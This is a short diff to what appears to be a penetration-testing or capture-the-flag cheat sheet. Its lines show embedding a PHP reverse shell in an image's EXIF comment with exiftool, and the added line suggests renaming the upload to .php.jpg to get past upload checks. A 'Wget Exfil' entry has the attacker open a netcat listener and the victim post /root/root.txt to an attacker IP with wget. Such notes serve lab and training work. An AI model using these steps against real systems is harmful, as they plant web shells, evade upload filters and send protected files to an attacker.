@@ -195,6 +195,7 @@ Exiftool: How to hide php shell within an image
 	- sudo apt update && apt upgrade -y 
 	- sudo apt install exiftool -y
 	- exiftool -Comment="$(< rev.php)" <image file that will be uploaded>
+		- If the shell doesn't execute, rename the uplaoded file to <name>.php.jpg
 Wget Exfil:
 	- On your machine: nc -lnvp 80
 	- On victim: wget --post-file=/root/root.txt <attacker IP>
